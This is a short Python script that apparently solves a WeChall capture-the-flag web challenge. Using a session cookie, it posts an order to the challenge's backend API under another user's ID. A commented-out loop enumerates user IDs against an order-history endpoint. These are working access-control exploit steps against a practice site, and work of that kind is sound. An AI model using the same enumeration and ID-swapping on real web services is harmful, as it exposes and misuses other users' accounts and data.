import requests

url = 'http://authme.wechall.net/challenge/gizmore/factor2/app/'
hist_uri = '../backend/api/bestellhistorie.php?user='
auth_uri = '../backend/api/authenticate.php'
order_uri = '../backend/api/bestellen.php'
login_uri = '../backend/api/login.php'

WC = '17998104-12786-VfKrTIjbSko90Xgs'

#postData = {'user': 1, 'token': 1}
postData = {'user': 6, 'id': 5678363, 'amt': 1}
cookie = {'WC':WC}
'''
for i in range(1, 100000):
    resp = requests.get(url + hist_uri + str(i), cookies=cookie)
    print(resp.text)

'''

resp = requests.post(url + order_uri, data=postData, cookies=cookie)
print(resp.text)